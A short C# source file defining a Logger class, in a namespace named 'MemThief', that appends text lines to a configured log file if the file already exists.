using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace MemThief
{
    class Logger
    {
        public static string LogFile = Config.LogStorage;
        
        public static void Add(string data)
        {
            if (File.Exists(LogFile))
            {
                string[] Newdata = { data };
                File.AppendAllLines(LogFile, Newdata);
            }
        }
    }
}
